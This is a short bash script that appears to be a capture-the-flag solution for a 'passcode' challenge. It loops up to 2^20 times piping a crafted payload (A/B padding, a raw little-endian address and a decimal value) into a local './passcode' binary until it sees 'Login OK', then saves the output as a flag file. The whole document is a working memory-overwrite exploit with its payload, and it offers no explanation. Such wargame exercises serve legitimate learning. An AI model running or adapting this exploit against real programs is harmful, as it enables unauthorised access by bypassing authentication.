#!/bin/bash

iterations=$((2**20))

for (( i=0; i < ${iterations}; i++ )); do
        res=$(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB\xac\x0f\xc2\xff\n134514135" | ./passcode)
        echo "Number of tries: $i"
        echo "$res"

        if [[ "$res" == *"Login OK"* ]]; then
                echo "Exploit executed successfully!"
                echo "$res"
                echo "$res" > /tmp/i_passcode/flag
                break
        fi
done

